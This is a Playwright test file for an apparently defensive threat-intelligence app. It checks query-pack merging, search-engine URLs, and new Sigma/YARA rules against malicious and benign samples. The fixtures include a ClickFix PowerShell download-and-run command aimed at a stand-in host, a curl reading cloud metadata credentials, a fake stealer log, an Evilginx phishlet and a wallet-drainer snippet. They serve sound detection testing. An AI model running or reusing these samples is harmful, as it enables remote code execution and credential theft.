// v1.69 content: the query pack (merged once, deletions respected), new engines, the new Sigma and YARA rules (lint clean,
// compile, fire on the thing they describe and not on the look-alike), the cloud OSINT guide, the Reference sections,
// the Tradecraft chapters and the playbooks.
const { test, expect } = require('@playwright/test');
const { open, noErrors } = require('./helpers');

test('query pack: merged into an existing library once, a deleted query stays deleted, new engines build real URLs', async ({ page }) => {
  const errors = await open(page, '#/queries');
  const r = await page.evaluate(() => {
    const has = id => DB.queries.some(q => q.id === id), n0 = DB.queries.length;
    const fresh = { all: QUERY_PACK.every(p => has('q' + p.id) || DB.queries.some(q => q.query.trim() === p.query.trim())), seeded: DB.qSeeded.length };
    // an old workspace: the library from before the pack, no record of what was offered
    DB.queries = DB.queries.filter(q => !q.id.startsWith('qp')); delete DB.qSeeded; ensureQueries();
    const merged = DB.queries.length;
    // the analyst deletes one; it must not come back
    DB.queries = DB.queries.filter(q => q.id !== 'qp13'); ensureQueries();
    const back = has('qp13'), again = DB.queries.length;
    const fav = DB.queries.find(q => q.id === 'qp01');
    return { fresh, n0, merged, back, again, fav: { cat: fav.cat, engines: fav.engines, vars: varsOf(fav.query) },
      urls: { urlscan: engineUrl('urlscan', 'page.domain:example.com'), crtsh: engineUrl('crtsh', '%.example.com'), fofa: engineUrl('fofa', 'icon_hash="-123"'), grep: engineUrl('grepapp', 'api.telegram.org/bot'), yandex: engineUrl('yandex', '"Ivan Petrov"') },
      cats: [...new Set(QUERY_PACK.map(q => q.category))].filter(c => !QCATS[c]), engs: [...new Set(QUERY_PACK.flatMap(q => q.engines))].filter(e => !ENGINES[e]) };
  });
  expect(r.fresh.all).toBe(true); expect(r.fresh.seeded).toBe(72);
  expect(r.merged).toBe(r.n0); expect(r.back).toBe(false); expect(r.again).toBe(r.n0 - 1);
  expect(r.fav).toEqual({ cat: 'pivots', engines: ['shodan'], vars: ['FAVICON_HASH'] });
  expect(r.cats).toEqual([]); expect(r.engs).toEqual([]);
  expect(r.urls.urlscan).toBe('https://urlscan.io/search/#page.domain%3Aexample.com');
  expect(r.urls.crtsh).toBe('https://crt.sh/?q=%25.example.com');
  expect(r.urls.fofa).toBe('https://en.fofa.info/result?qbase64=' + encodeURIComponent(Buffer.from('icon_hash="-123"').toString('base64')));
  expect(r.urls.grep).toBe('https://grep.app/search?q=api.telegram.org%2Fbot');
  expect(r.urls.yandex).toContain('yandex.com/search/?text=%22Ivan%20Petrov%22');
  // the page shows them: search, then the infrastructure-pivot category
  await page.evaluate(() => { UI.qq = 'favicon'; renderMain(); });
  await expect(page.locator('#main')).toContainText('Shodan — servers sharing a favicon');
  await expect(page.locator('#main')).toContainText('Infrastructure pivots');
  noErrors(errors);
});

test('new detection rules: lint clean, YARA compiles, and each fires on its case and not on the look-alike', async ({ page }) => {
  const errors = await open(page, '#/detections');
  await page.waitForFunction(() => typeof RULE_PACK !== 'undefined' && DB.rules.some(r => r.id === 'pk-yar-092'));
  const r = await page.evaluate(() => {
    const NEW = RULE_PACK.filter(x => x.created === '2026-11-23T00:00:00Z'), byT = t => NEW.find(x => x.title === t), out = { n: NEW.length, sig: NEW.filter(x => x.type === 'sigma').length, lint: [], compile: [] };
    for (const x of NEW) { const rule = DB.rules.find(z => z.id === x.id); const L = ruleLint(rule).filter(l => l.sev !== 'info'); if (L.length) out.lint.push(x.title + ': ' + L.map(l => l.t).join('; '));
      if (x.type === 'yara') { const res = yaraScan(x.code, new TextEncoder().encode('nothing here')); const e = res.find(z => z.error); if (e) out.compile.push(x.title + ': ' + e.error); } }
    const yara = (t, text) => yaraScan(byT(t).code, new TextEncoder().encode(text)).some(z => z.match);
    const sig = (t, f) => sigmaEval(sigmaParse(byT(t).code), Object.assign({ _raw: '', _orig: '' }, f));
    const tok = '7012345678:AAH' + 'x'.repeat(32);
    const pw = Array.from({ length: 7 }, (_, i) => `URL: https://site${i}.example/login\nUsername: user${i}@corp.example\nPassword: Pa55-${i}\nApplication: Google_[Chrome]_Default\n===============`).join('\n');
    out.yara = {
      tgToken: yara('Telegram Bot Token Embedded in a File', `const B="https://api.telegram.org/bot${tok}/sendDocument";`),
      tgNoApi: yara('Telegram Bot Token Embedded in a File', `id ${tok}`),
      clickfix: yara('ClickFix or Fake CAPTCHA Clipboard Lure', `<p>Press Win + R, then CTRL + V</p><script>navigator.clipboard.writeText("powershell -w h -c iex(irm 'https://x.example/a')")</script>`),
      copyOnly: yara('ClickFix or Fake CAPTCHA Clipboard Lure', `<script>navigator.clipboard.writeText(location.href)</script> Press Win + R`),
      stealerLog: yara('Info-Stealer Log Credential File', pw),
      oneLogin: yara('Info-Stealer Log Credential File', 'URL: https://a.example\nUsername: me\nPassword: x\nApplication: Chrome'),
      phishlet: yara('Evilginx Phishlet Configuration', 'min_ver: "3.0.0"\nproxy_hosts:\n  - {phish_sub: "login", orig_sub: "login", domain: "example.com"}\nsub_filters: []\nauth_tokens:\n  - domain: ".example.com"\ncredentials:\n  username: {key: "user"}\nlogin:\n  domain: "login.example.com"'),
      awsKey: yara('AWS Access Key and Secret in a File', 'aws_access_key_id = AKIAABCDEFGHIJKLMNOP\naws_secret_access_key = abc'),
      awsIdOnly: yara('AWS Access Key and Secret in a File', 'AKIAABCDEFGHIJKLMNOP'),
      drainer: yara('Wallet Drainer Kit Reporting to Telegram', 'ethereum.request({method:"eth_requestAccounts"}); c.setApprovalForAll(r,true); t.transferFrom(a,b,c); fetch("https://api.telegram.org/bot1/sendMessage")'),
      dapp: yara('Wallet Drainer Kit Reporting to Telegram', 'ethereum.request({method:"eth_requestAccounts"}); c.setApprovalForAll(r,true); t.transferFrom(a,b,c);'),
    };
    out.sigma = {
      webhook: sig('Discord Webhook Used by Non-Browser Client', { 'c-uri': 'https://discord.com/api/webhooks/1234/abcd', 'c-useragent': 'python-requests/2.31' }),
      webhookBrowser: sig('Discord Webhook Used by Non-Browser Client', { 'c-uri': 'https://discord.com/api/webhooks/1234/abcd', 'c-useragent': 'mozilla/5.0 (windows nt 10.0)' }),
      poll: sig('Telegram Bot Polling for Commands (getUpdates)', { 'c-uri': 'https://api.telegram.org/bot123:aa/getupdates?offset=1', 'c-useragent': 'go-http-client/1.1' }),
      send: sig('Telegram Bot Polling for Commands (getUpdates)', { 'c-uri': 'https://api.telegram.org/bot123:aa/senddocument', 'c-useragent': 'go-http-client/1.1' }),
      imds: sig('Cloud Instance Metadata Credentials Read From Shell', { commandline: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role' }),
      imdsPlain: sig('Cloud Instance Metadata Credentials Read From Shell', { commandline: 'curl -s http://169.254.169.254/latest/meta-data/instance-id' }),
      clickfix: sig('PowerShell Started From the Run Dialog With a Download (ClickFix)', { parentimage: 'c:\\windows\\explorer.exe', image: 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe', commandline: 'powershell -w h -c "iex (irm https://x.example/a)"' }),
      fromCmd: sig('PowerShell Started From the Run Dialog With a Download (ClickFix)', { parentimage: 'c:\\windows\\system32\\cmd.exe', image: 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe', commandline: 'powershell -c "iex (irm https://x.example/a)"' }),
      geo: sig('IP Geolocation Service Queried by Non-Browser Process', { queryname: 'ip-api.com', image: 'c:\\users\\a\\appdata\\local\\temp\\svc.exe' }),
      geoChrome: sig('IP Geolocation Service Queried by Non-Browser Process', { queryname: 'ip-api.com', image: 'c:\\program files\\google\\chrome\\application\\chrome.exe' }),
      trail: sig('AWS CloudTrail Logging Stopped or Trail Deleted', { eventsource: 'cloudtrail.amazonaws.com', eventname: 'stoplogging' }),
      dwd: sig('Google Workspace Domain-Wide Delegation Granted', { eventservice: 'admin.googleapis.com', eventname: 'authorize_api_client_access' }),
      roam: sig('Okta Session Used From Another Network (Cookie Theft)', { eventtype: 'security.session.detect_client_roaming' }),
    };
    return out;
  });
  expect(r.n).toBe(87); expect(r.sig).toBe(72);
  expect(r.lint).toEqual([]); expect(r.compile).toEqual([]);
  expect(r.yara).toEqual({ tgToken: true, tgNoApi: false, clickfix: true, copyOnly: false, stealerLog: true, oneLogin: false, phishlet: true, awsKey: true, awsIdOnly: false, drainer: true, dapp: false });
  expect(r.sigma).toEqual({ webhook: true, webhookBrowser: false, poll: true, send: false, imds: true, imdsPlain: false, clickfix: true, fromCmd: false, geo: true, geoChrome: false, trail: true, dwd: true, roam: true });
  // a CloudTrail event pasted as evidence is matched by the real pipeline (record → fields → rule)
  const hit = await page.evaluate(() => {
    const c = { id: 'c-ct', code: 'CT-1', name: 'Trail check', color: '#6366f1', status: 'active', created: Date.now(), updated: Date.now() }; DB.cases.push(c);
    DB.records.push({ id: 'r-ct', caseId: 'c-ct', type: 'evidence', title: 'CloudTrail event', body: JSON.stringify({ eventVersion: '1.08', eventSource: 'cloudtrail.amazonaws.com', eventName: 'StopLogging', awsRegion: 'eu-west-1', sourceIPAddress: '203.0.113.9', userIdentity: { type: 'IAMUser', userName: 'ci-bot' } }), ts: Date.now(), tsRaw: new Date().toISOString(), tsZone: 'explicit', source: 'paste', ents: [] });
    const rule = DB.rules.find(x => x.title === 'AWS CloudTrail Logging Stopped or Trail Deleted'); const R = testRule(rule, 'c-ct'); return R.error || R.hits.length;
  });
  expect(hit).toBe(1);
  noErrors(errors);
});

test('cloud OSINT guide, reference sections, tradecraft chapters and the new playbooks are reachable and searchable', async ({ page }) => {
  const errors = await open(page, '#/cloud');
  await page.evaluate(() => { UI.cgQ = 'getuserrealm'; renderMain(); });
  await expect(page.locator('.cg-it')).toHaveCount(1); await expect(page.locator('.cg-it b')).toHaveText('Microsoft 365 tenant from a domain');
  await expect(page.locator('#cgDetail')).toContainText('do not appear in the target’s sign-in logs');
  await page.evaluate(() => { UI.cgQ = ''; UI.cgCat = 'Cloud OSINT — outside in'; UI.cgCatPinned = true; renderMain(); });
  await expect(page.locator('.cg-it')).toHaveCount(9);
  // Reference: decode-it-yourself IDs, key shapes and the identity-provider events
  for (const [q, want] of [['snowflake discord', '1420070400000'], ['AKIA', 'get-access-key-info'], ['detect_client_roaming', 'stolen session cookie'], ['AUTHORIZE_API_CLIENT_ACCESS', 'act as any user']]) {
    await page.evaluate(q => { location.hash = '#/reference'; UI.refQ = q; UI.refRow = null; renderMain(); }, q);
    await expect(page.locator('.rf2-r').first()).toBeVisible(); await page.locator('.rf2-r').first().click();
    await expect(page.locator('#main')).toContainText(want);
  }
  // Tradecraft: the two new chapters, their links go to real places, search finds a trick
  await page.evaluate(() => go('#/tradecraft'));
  await expect(page.locator('#tc-tricks h2')).toContainText('Tricks that save hours'); await expect(page.locator('#tc-detect h2')).toContainText('From findings to detections');
  await page.locator('#tc-tricks [data-act=tcGo][data-v=cloud]').click(); await expect(page).toHaveURL(/#\/cloud/);
  await page.evaluate(() => go('#/tradecraft')); await page.locator('#tc-tricks [data-act=tcGo][data-v=queries]').first().click(); await expect(page).toHaveURL(/#\/queries/);
  await page.evaluate(() => go('#/tradecraft')); await page.fill('#tcQ', 'Gravatar'); await expect(page.locator('.tc-part li')).toHaveCount(1);
  // the playbooks
  const pb = await page.evaluate(async () => { await lazyNeed('pb'); ensurePlaybooks(); return ['pb-cloud-footprint', 'pb-stealer-log', 'pb-aitm', 'pb-drainer'].map(id => (DB.playbooks.find(p => p.id === id) || {}).steps?.length || 0); });
  expect(pb.every(n => n >= 6)).toBe(true);
  noErrors(errors);
});
